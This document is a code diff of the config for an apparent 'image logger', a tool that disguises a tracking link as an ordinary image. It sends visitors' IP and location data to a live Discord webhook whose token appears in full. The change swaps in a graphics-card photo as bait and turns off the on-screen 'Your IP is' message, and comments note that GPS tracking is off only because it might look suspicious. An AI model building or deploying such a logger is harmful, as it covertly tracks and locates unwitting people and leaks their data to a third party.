@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1094438177076424744/sGNWvMGAvhW-nHGoUyyRVIKAQK2kXybksnLiw6Ek-BUlWPE9pNYVP2GKMQsrLw5V02Zw",
-    "image": "https://th.bing.com/th/id/OIP.wMTQ663rXoL8W1R1g8rH7wHaFY?pid=ImgDet&rs=1", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.wccftech.com/wp-content/uploads/2022/06/geforce-rtx-3060-ti-product-gallery-full-screen-3840-1-bl-very_compressed-scale-6_00x-Custom-2048x1146.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,9 +27,9 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "Your IP is {ip}", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
